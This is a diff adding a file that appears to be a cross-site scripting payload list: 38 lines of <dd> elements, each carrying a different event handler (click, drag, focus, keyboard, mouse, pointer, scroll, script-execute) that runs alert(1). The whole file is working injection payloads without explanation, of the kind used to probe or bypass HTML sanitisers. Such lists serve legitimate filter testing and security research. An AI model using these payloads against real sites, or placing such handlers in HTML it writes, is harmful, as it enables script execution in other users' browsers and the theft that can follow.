@@ -1,0 +1,38 @@
+<dd contenteditable onbeforeinput=alert(1)>test
+<dd draggable="true" ondrag="alert(1)" style=display:block>test</dd>
+<dd draggable="true" ondragend="alert(1)" style=display:block>test</dd>
+<dd draggable="true" ondragenter="alert(1)" style=display:block>test</dd>
+<dd draggable="true" ondragleave="alert(1)" style=display:block>test</dd>
+<dd draggable="true" ondragstart="alert(1)" style=display:block>test</dd>
+<dd id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></dd>
+<dd id=x tabindex=1 onfocus=alert(1)></dd>
+<dd id=x tabindex=1 onfocusin=alert(1)></dd>
+<dd onafterscriptexecute=alert(1)><script>1</script>
+<dd onbeforescriptexecute=alert(1)><script>1</script>
+<dd onblur=alert(1) id=x tabindex=1 style=display:block>test</dd><input value=clickme>
+<dd onclick="alert(1)" style=display:block>test</dd>
+<dd oncontextmenu="alert(1)" style=display:block>test</dd>
+<dd oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<dd oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<dd ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</dd>
+<dd onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</dd><input value=clickme>
+<dd onkeydown="alert(1)" contenteditable style=display:block>test</dd>
+<dd onkeypress="alert(1)" contenteditable style=display:block>test</dd>
+<dd onkeyup="alert(1)" contenteditable style=display:block>test</dd>
+<dd onmousedown="alert(1)" style=display:block>test</dd>
+<dd onmouseenter="alert(1)" style=display:block>test</dd>
+<dd onmouseleave="alert(1)" style=display:block>test</dd>
+<dd onmousemove="alert(1)" style=display:block>test</dd>
+<dd onmouseout="alert(1)" style=display:block>test</dd>
+<dd onmouseover="alert(1)" style=display:block>test</dd>
+<dd onmouseup="alert(1)" style=display:block>test</dd>
+<dd onmousewheel=alert(1) style=display:block>requires scrolling
+<dd onpointerdown=alert(1) style=display:block>XSS</dd>
+<dd onpointerenter=alert(1) style=display:block>XSS</dd>
+<dd onpointerleave=alert(1) style=display:block>XSS</dd>
+<dd onpointermove=alert(1) style=display:block>XSS</dd>
+<dd onpointerout=alert(1) style=display:block>XSS</dd>
+<dd onpointerover=alert(1) style=display:block>XSS</dd>
+<dd onpointerrawupdate=alert(1) style=display:block>XSS</dd>
+<dd onpointerup=alert(1) style=display:block>XSS</dd>
+<dd onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dd>
